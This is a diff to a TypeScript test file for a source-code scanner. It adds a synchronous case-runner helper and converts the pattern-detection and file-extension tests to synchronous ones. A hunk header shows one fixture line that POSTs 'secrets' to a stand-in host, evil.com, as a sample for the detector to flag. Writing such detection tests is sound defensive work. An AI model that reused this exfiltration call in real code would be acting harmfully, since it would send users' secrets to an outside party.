@@ -86,6 +86,14 @@ async function runNamedCase(name: string, run: () => void | Promise<void>) {
   }
 }
 
+function runSyncNamedCase(name: string, run: () => void) {
+  try {
+    run();
+  } catch (error) {
+    throw new Error(`case failed: ${name}`, { cause: error });
+  }
+}
+
 function normalizeSkillScanOptions(
   options?: Readonly<{
     maxFiles?: number;
@@ -223,9 +231,9 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     },
   ] as const;
 
-  it("detects suspicious source patterns", async () => {
+  it("detects suspicious source patterns", () => {
     for (const testCase of scanRuleCases) {
-      await runNamedCase(testCase.name, () => {
+      runSyncNamedCase(testCase.name, () => {
         expectScanRule(testCase.source, testCase.expected);
       });
     }
@@ -278,7 +286,7 @@ async function closeFetchHandles() {
 // ---------------------------------------------------------------------------
 
 describe("isScannable", () => {
-  it("classifies scannable extensions", async () => {
+  it("classifies scannable extensions", () => {
     for (const [fileName, expected] of [
       ["file.js", true],
       ["file.ts", true],
@@ -291,7 +299,7 @@ describe("isScannable", () => {
       ["logo.png", false],
       ["style.css", false],
     ] as const) {
-      await runNamedCase(fileName, () => {
+      runSyncNamedCase(fileName, () => {
         expect(isScannable(fileName)).toBe(expected);
       });
     }
